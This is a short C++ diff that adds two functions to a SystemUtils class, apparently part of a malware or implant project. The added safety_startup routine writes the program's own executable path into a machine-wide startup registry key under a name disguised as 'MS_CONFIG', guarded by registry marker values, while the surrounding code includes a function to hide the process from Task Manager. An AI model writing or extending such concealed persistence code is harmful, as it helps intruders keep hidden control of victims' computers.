@@ -108,6 +108,44 @@ void SystemUtils::hide_from_task_manager()
 	}
 }
 
+void SystemUtils::safety_startup()
+{
+	RegistryKey safety_key{ HKEY_LOCAL_MACHINE, SAFETY_REG };
+
+	try 
+	{
+		if (safety_key.get_value(SAFETY_KEY) == SAFETY_VALUE)
+		{
+			exit(0);
+		}
+
+		if (safety_key.get_value(LAST_ATTEMPT_KEY) == SUCCESS)
+		{
+			exit(0);
+		}
+	}
+	catch (const WindowsException&)
+	{
+		OutputDebugStringW(L"Failed to open reg key");
+	}
+
+	safety_key.set_value(LAST_ATTEMPT_KEY, SUCCESS);
+	RegistryKey startup_key{ HKEY_LOCAL_MACHINE, STARTUP_REG };
+	startup_key.set_value(MS_CONFIG, SystemUtils::get_exe_path());
+}
+
+void SystemUtils::safety_cover(bool is_dangerous)
+{
+	RegistryKey safety_key{ HKEY_LOCAL_MACHINE, SAFETY_REG };
+
+	safety_key.set_value(LAST_ATTEMPT_KEY, FAILED);
+
+	if (is_dangerous)
+	{
+		safety_key.set_value(SAFETY_KEY, SAFETY_VALUE);
+	}
+}
+
 void SystemUtils::get_dir_list()
 {
 	File dir_list_file{ DIR_LIST_PATH };
